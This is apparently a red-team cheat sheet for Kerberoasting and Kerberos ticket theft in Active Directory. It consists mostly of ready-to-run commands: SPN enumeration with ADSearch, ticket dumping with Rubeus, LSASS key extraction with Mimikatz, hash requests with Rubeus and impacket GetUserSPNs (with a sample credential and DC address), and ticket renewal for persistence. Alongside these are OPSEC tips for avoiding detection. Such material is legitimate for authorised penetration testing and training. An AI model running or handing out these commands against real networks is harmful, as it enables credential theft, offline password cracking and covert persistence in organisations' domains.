Hash format: hashcat 13100
 - Creates 4768 event, multiple 4768 event over short time from one user can standout.
- Windows tickets uses AES128 and 258, RC4 tickets can standout.
- Honey Tickets may be used by defenders (Dummy SPNs that is never supposed to be used).

- [ ] Enumerate for valid SPNs
- [ ] Extract tickets already stored in memory

(ADSearch) SPN enumeration
```bash
ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
```
(Rubeus) Extract ticket of currently logon session
- Rubeus extracts ticket using LSA APIs
```bash
Rubeus.exe triage
```
(Rubeus) Extract every single ticket
- Use /service and /luid to target specific service or logon session
```bash
Rubeus.exe dump /service:krbtgt /nowrap
```
(Mimikatz) Dumping tickets from LSASS memory
- Bad OPSEC because interacting with LSASS
```bash
mimikatz.exe sekurlsa::ekeys
```
(Rubeus) Kerberoasting (default john hash)
- Ask for RC4 encryption ticket
- Target an SPN with /spn:<SPN_NAME>
```bash
Rubeus.exe kerberoast /format:hashcat /simple
```
(GetUserSPNs) Kerberoasting
```bash
impacket-GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC IP> -request 

impacket-GetUserSPNs.py medin.local/tm:Password1 -dc-ip 172.16.105.100 -request -outputfile krb.hash
```
### Persistence
(Rubeus) Obtained ticket information
```bash
Rubeus.exe describe /ticket:<TICKET>
```
(Rubeus) Renew ticket
```bash
Rubeus.exe renew /ticket:<TICKET> /nowrap
```